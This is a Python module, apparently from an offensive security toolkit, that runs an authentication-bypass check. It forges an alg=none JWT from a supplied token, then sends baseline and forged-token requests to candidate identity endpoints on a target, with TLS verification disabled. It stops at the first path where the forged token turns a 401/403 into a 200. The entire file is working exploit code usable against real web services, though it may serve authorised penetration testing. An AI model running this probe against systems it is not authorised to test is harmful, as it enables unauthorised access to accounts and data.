"""
Network execution for the identity-endpoint auth-bypass check: sends an
unauthenticated baseline and an alg=none forged-token request to each
candidate identity path. No parsing logic here -- see parse.py.
"""
from __future__ import annotations

from typing import Any, Dict, Optional

import requests
import urllib3

from tradecraft.adapters.identity_auth_bypass import parse as iab_parse
from tradecraft.adapters.jwt_analyze import execute as jwt_execute

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_TIMEOUT = 10


def execute(
    target: str,
    token: str,
    test_path: str = "",
    timeout: int = DEFAULT_TIMEOUT,
    session: Optional[requests.Session] = None,
) -> Dict[str, Any]:
    """Probe candidate identity paths under target with a forged token.

    Returns a raw dict: {"target", "forged_token", "probes": [...]} with
    one probe entry per path actually tested (baseline_status and/or
    forged_status are None, with an "error" key set, on a request
    failure). Probing stops at the first confirmed hit. An undecodable
    token returns {"target", "error"}.

    Each baseline/forged pair is sent independently, with no shared
    cookie jar across requests -- a caller-injected session (tests only)
    is used as-is, but production calls never create or reuse a
    requests.Session, matching jwt_analyze's run_differential. This
    matters: a cookie set by one response must never leak into a later
    baseline/forged request on this or any other path, since that could
    cause the real cause of a status change to be misattributed to the
    forged token.
    """
    base = iab_parse.normalize_base_url(target)
    if not base:
        return {"target": target, "error": "empty target URL"}

    try:
        header, payload = jwt_execute.decode_jwt_claims(token)
    except ValueError as exc:
        return {"target": base, "error": f"invalid JWT: {exc}"}

    forged = jwt_execute.forge_none_alg_token(header, payload)
    headers = {"Authorization": f"Bearer {forged}"}
    getter = session.get if session is not None else requests.get

    probes = []
    for path in iab_parse.candidate_paths(test_path):
        url = base + path
        try:
            baseline = getter(url, timeout=timeout, verify=False, allow_redirects=False)
            baseline_status: Optional[int] = baseline.status_code
        except requests.RequestException as exc:
            probes.append({
                "path": path,
                "url": url,
                "baseline_status": None,
                "forged_status": None,
                "error": str(exc),
            })
            continue
        try:
            forged_resp = getter(url, headers=headers, timeout=timeout, verify=False, allow_redirects=False)
            forged_status: Optional[int] = forged_resp.status_code
        except requests.RequestException as exc:
            probes.append({
                "path": path,
                "url": url,
                "baseline_status": baseline_status,
                "forged_status": None,
                "error": str(exc),
            })
            continue
        probes.append({
            "path": path,
            "url": url,
            "baseline_status": baseline_status,
            "forged_status": forged_status,
        })
        if baseline_status in (401, 403) and forged_status == 200:
            break

    return {"target": base, "forged_token": forged, "probes": probes}
